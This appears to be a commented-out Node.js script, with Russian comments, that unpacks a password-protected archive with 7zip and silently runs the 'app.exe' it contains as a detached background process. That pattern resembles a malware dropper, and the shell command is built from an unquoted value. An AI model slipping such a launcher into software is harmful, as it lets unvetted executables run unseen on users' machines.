// const { exec } = require("child_process");
// const pathTo7zip = require("7zip-bin").path7za;
// const path = require("path");
// const fs = require("fs").promises; // Используем promisify для работы с fs

// const unzipWithPassword = async (archivePath, extractToPath, password) => {
//   const command = `"${pathTo7zip}" x "${archivePath}" -o"${extractToPath}" -p${password}`;

//   try {
//     const { stdout, stderr } = await execPromise(command);
//     console.log(`Archive extracted: ${stdout}`);
//     if (stderr) {
//       console.error(`Stderr during extraction: ${stderr}`);
//     }

//     const files = await fs.readdir(extractToPath);
//     console.log("Extracted files:", files);

//     const extractedFilePath = path.join(extractToPath, "app.exe");
//     const absoluteFilePath = path.resolve(extractedFilePath);
//     console.log(`Checking for file: ${absoluteFilePath}`);

//     if (files.includes("app.exe")) {
//       console.log("Found app.exe, attempting to run it...");
//       await runExtractedFile(absoluteFilePath);
//     } else {
//       console.error("Error: app.exe not found in the extracted files.");
//     }
//   } catch (error) {
//     console.error(`Error extracting archive: ${error.message}`);
//   }
// };

// const execPromise = (command) => {
//   return new Promise((resolve, reject) => {
//     exec(command, (error, stdout, stderr) => {
//       if (error) {
//         return reject(error);
//       }
//       resolve({ stdout, stderr });
//     });
//   });
// };

// const runExtractedFile = async (filePath) => {
//   console.log(`Running file: ${filePath}`);
//   const child = exec(
//     `"${filePath}"`,
//     { detached: true, stdio: "ignore" },
//     (error) => {
//       if (error) {
//         console.error(`Error running file: ${error.message}`);
//       }
//     }
//   );

//   child.unref(); // Отсоединяем процесс от родительского
// };

// const archivePath = "./js.zip";
// const extractToPath = "./extracted";
// const password = "123";

// unzipWithPassword(archivePath, extractToPath, password);
